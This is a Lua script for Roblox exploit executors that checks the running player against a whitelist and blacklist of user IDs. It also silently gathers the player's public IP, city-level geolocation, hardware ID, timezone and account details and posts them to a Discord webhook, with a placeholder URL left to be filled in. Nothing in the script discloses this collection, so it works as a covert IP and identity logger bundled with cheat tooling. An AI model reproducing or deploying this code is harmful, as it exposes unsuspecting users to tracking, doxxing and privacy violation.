-- combined.lua
local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- HTTP request function
local req = (syn and syn.request)
         or (http and http.request)
         or request
         or http_request
if not req then
    return { Authorized = false, Reason = "HTTP unavailable" }
end

-- Whitelist / Blacklist tables
local whitelist = {
    8233300272, 8252696642, 1318379910,
    8291504206, 1415993233, 8217130396,
    6099966303,
}
local blacklist = { 87654321 }

local function contains(t,v)
    for _,x in ipairs(t) do
        if x == v then return true end
    end
    return false
end

-- Decide status
local myId = LocalPlayer.UserId
local status, authorized
if contains(blacklist, myId) then
    status     = "Banned"
    authorized = false
elseif contains(whitelist, myId) then
    status     = "Authorized"
    authorized = true
else
    status     = "Not authorized"
    authorized = false
end

-- Detectors
local function detectHWID()
    if getgenv and getgenv().gethwid then
        return getgenv().gethwid()
    end
    if syn and syn.getexecutorinfo then
        local info = syn.getexecutorinfo()
        return tostring((info and info[1]) or "Unknown")
    end
    return "hwid_"..HttpService:GenerateGUID(false)
end

local function detectIP()
    local ok, res = pcall(function()
        return req({ Url="https://api.ipify.org", Method="GET" }).Body
    end)
    return (ok and res) or "Unknown"
end

local function detectGeo(ip)
    local ok, res = pcall(function()
        return req({ Url="https://ipinfo.io/"..ip.."/json", Method="GET" }).Body
    end)
    if ok and res then
        local info = HttpService:JSONDecode(res)
        return string.format("%s, %s, %s",
            info.city or "?", info.region or "?", info.country or "?")
    end
    return "Unknown"
end

local function detectTimezone()
    local name = os.date("%Z") or "Unknown"
    local off  = os.date("%z") or ""
    return name .. " (UTC" .. off .. ")"
end

-- Gather data
local ip       = detectIP()
local geo      = detectGeo(ip)
local hwid     = detectHWID()
local timezone = detectTimezone()

-- Build webhook payload
local data = {
    content = "",
    embeds = {{
        title  = "User Executed Script",
        color  = 16777215,
        fields = {
            { name="Username",     value=LocalPlayer.Name, inline=true },
            { name="Display Name", value=LocalPlayer.DisplayName or "N/A", inline=true },
            { name="User ID",      value=tostring(myId), inline=true },
            { name="Account Age",  value=tostring(LocalPlayer.AccountAge).." days", inline=true },
            { name="Profile",      value="https://www.roblox.com/users/"..myId.."/profile", inline=false },
            { name="HWID",         value=hwid, inline=false },
            { name="Public IP",    value=ip, inline=false },
            { name="Geo Location", value=geo, inline=false },
            { name="Timezone",     value=timezone, inline=false },
            { name="Auth Status",  value=status, inline=false },
        }
    }}
}

-- Send webhook (replace with your real URL)
pcall(function()
    req({
        Url     = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode(data)
    })
end)

-- Return for gating
return { Authorized = authorized, Reason = status }
